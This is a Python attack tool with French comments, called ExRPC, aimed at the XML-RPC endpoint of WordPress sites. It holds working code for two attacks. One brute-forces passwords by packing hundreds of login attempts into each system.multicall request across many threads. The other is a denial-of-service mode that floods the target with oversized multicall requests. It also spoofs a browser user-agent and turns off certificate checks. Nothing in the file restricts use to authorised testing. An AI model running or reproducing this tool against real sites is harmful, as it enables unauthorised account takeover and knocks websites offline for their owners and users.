import sys
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List
import time
import warnings

# Désactive les avertissements SSL (seulement pour les tests)
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ─── Couleurs ANSI ───────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
ENDC   = "\033[0m"

# ─── Configuration ───────────────────────────────────────────────────────────
TIMEOUT = 15
MAX_WORKERS = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
REQUESTS_PER_THREAD = 200  # pour le DoS

def is_xmlrpc_available(base_url: str) -> bool:
    """Vérifie si xmlrpc.php est accessible et fonctionnel"""
    url = base_url.rstrip("/") + "/xmlrpc.php"
    payload = """<?xml version="1.0"?>
    <methodCall>
      <methodName>system.listMethods</methodName>
    </methodCall>"""

    try:
        r = requests.post(
            url,
            data=payload,
            headers={"User-Agent": USER_AGENT},
            timeout=TIMEOUT,
            verify=False
        )
        if r.status_code != 200:
            return False
        text = r.text.lower()
        return "faultcode" not in text and "wp.getusersblogs" in text
    except:
        return False

def generate_multicall_payload(username: str, passwords: List[str]) -> str:
    """Génère un payload system.multicall pour tester plusieurs mots de passe d'un coup"""
    calls = []
    for pwd in passwords:
        calls.append(f"""
        <value>
          <struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
              <value><string>{username}</string></value>
              <value><string>{pwd.replace('&', '&amp;').replace('<', '&lt;')}</string></value>
            </data></array></value></member>
          </struct>
        </value>""")

    return f"""<?xml version="1.0"?>
    <methodCall>
      <methodName>system.multicall</methodName>
      <params><param><value><array><data>{''.join(calls)}</data></array></value></param></params>
    </methodCall>"""

def try_chunk(session: requests.Session, url: str, username: str, pw_chunk: List[str]) -> Optional[str]:
    """Tente un chunk de mots de passe via multicall"""
    payload = generate_multicall_payload(username, pw_chunk)
    try:
        r = session.post(url, data=payload, timeout=TIMEOUT)
        if "<boolean>1</boolean>" in r.text or "isAdmin" in r.text:
            # Recherche du mot de passe qui a réussi (heuristique simple)
            for pwd in pw_chunk:
                if f">{pwd}<" in r.text or f">{pwd.replace('&', '&amp;')}<" in r.text:
                    return pwd
        return None
    except:
        return None

def bruteforce(base_url: str, username: str, wordlist_path: str, chunk_size: int = 500):
    url = base_url.rstrip("/") + "/xmlrpc.php"
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Fichier {wordlist_path} introuvable{ENDC}")
        sys.exit(1)

    print(f"{BLUE}[*] Bruteforce de '{username}' avec {len(passwords)} mots de passe...{ENDC}")
    print(f"{YELLOW}[*] Utilisation de system.multicall (jusqu'à {chunk_size} essais par requête){ENDC}")

    chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for chunk in chunks:
            futures.append(executor.submit(try_chunk, session, url, username, chunk))

        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"\n{GREEN}[+] MOT DE PASSE TROUVÉ !{ENDC}")
                print(f"{GREEN}[+] Username : {username}{ENDC}")
                print(f"{GREEN}[+] Password : {result}{ENDC}")
                return

    print(f"{RED}[!] Aucun mot de passe valide trouvé.{ENDC}")

def dos_amplification(base_url: str, threads: int = 50):
    url = base_url.rstrip("/") + "/xmlrpc.php"
    print(f"{YELLOW}[!] Lancement du DoS par amplification XML-RPC (system.multicall)...{ENDC}")
    print(f"{YELLOW}[!] {threads} threads, {REQUESTS_PER_THREAD} requêtes par thread{ENDC}")

    payload = generate_multicall_payload("admin", ["wrongpass"] * 500)  # 500 essais par requête

    def worker():
        s = requests.Session()
        s.headers.update({"User-Agent": USER_AGENT})
        for _ in range(REQUESTS_PER_THREAD):
            try:
                s.post(url, data=payload, timeout=10, verify=False)
            except:
                pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(lambda _: worker(), range(threads))

def main():
    print(r"""
                        _                __  __      _       _ _   
        __  ___ __ ___ | |_ __ _ __   ___\ \/ /_ __ | | ___ (_) |_ 
        \ \/ / '_ ` _ \| | '__| '_ \ / __|\  /| '_ \| |/ _ \| | __|
         >  <| | | | | | | |  | |_) | (__ /  \| |_) | | (_) | | |_ 
        /_/\_\_| |_| |_|_|_|  | .__/ \___/_/\_\ .__/|_|\___/|_|\__|
                              |_|             |_|                  
""")
    parser = argparse.ArgumentParser(description="ExRPC - WordPress XML-RPC Bruteforce & DoS Tool")
    parser.add_argument("target", help="URL cible (ex: http://example.com/)")
    parser.add_argument("--mode", choices=["brute", "dos"], required=True, help="Mode : brute ou dos")
    parser.add_argument("--user", help="Nom d'utilisateur à bruteforcer (obligatoire en mode brute)")
    parser.add_argument("--wordlist", help="Chemin vers la wordlist (obligatoire en mode brute)")
    parser.add_argument("--threads", type=int, default=50, help="Nombre de threads pour le DoS (défaut: 50)")

    args = parser.parse_args()

    print(f"{BLUE}ExRPC v2.0 - WordPress XML-RPC Tool{ENDC}")
    print(f"{BLUE}Cible : {args.target}{ENDC}")

    if not is_xmlrpc_available(args.target):
        print(f"{RED}[!] XML-RPC non disponible ou protégé sur cette cible.{ENDC}")
        sys.exit(1)

    print(f"{GREEN}[+] XML-RPC détecté et fonctionnel !{ENDC}")

    if args.mode == "brute":
        if not args.user or not args.wordlist:
            print(f"{RED}[!] --user et --wordlist sont obligatoires en mode brute{ENDC}")
            sys.exit(1)
        bruteforce(args.target, args.user, args.wordlist)
    else:  # dos
        dos_amplification(args.target, args.threads)

if __name__ == "__main__":
    main()